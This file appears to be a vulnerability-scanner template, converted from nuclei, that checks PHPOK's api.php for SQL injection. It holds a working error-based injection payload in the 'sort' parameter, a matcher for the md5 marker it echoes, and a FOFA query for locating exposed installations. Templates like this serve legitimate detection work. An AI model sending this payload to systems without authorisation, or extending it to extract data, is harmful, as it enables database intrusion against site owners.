@@ -1,0 +1,134 @@
+{
+  "id": "phpok-sqli",
+  "name": "PHPOK - SQL Injection",
+  "author": "ritikchaddha",
+  "severity": "CRITICAL",
+  "description": "PHPOK contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.",
+  "references": [
+    "https://cve.report/software/phpok/phpok"
+  ],
+  "tags": [
+    "phpok",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"phpok\""
+  },
+  "variables": {
+    "num": [
+      "999999999"
+    ]
+  },
+  "variablesType": "sniper",
+  "cweId": "CWE-89",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/api.php?c\u003dproject\u0026f\u003dindex\u0026token\u003d1234\u0026id\u003dnews\u0026sort\u003d1 and extractvalue(1,concat(0x7e,md5({{num}}))) --+",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "{{md5({{num}})}}"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "phpok-sqli",
+    "info": {
+      "name": "PHPOK - SQL Injection",
+      "author": "ritikchaddha",
+      "severity": "critical",
+      "description": "PHPOK contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.",
+      "reference": [
+        "https://cve.report/software/phpok/phpok"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-89"
+      },
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "app\u003d\"phpok\""
+      },
+      "tags": "phpok,sqli"
+    },
+    "variables": {
+      "num": "999999999"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/api.php?c\u003dproject\u0026f\u003dindex\u0026token\u003d1234\u0026id\u003dnews\u0026sort\u003d1 and extractvalue(1,concat(0x7e,md5({{num}}))) --+"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "{{md5({{num}})}}"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
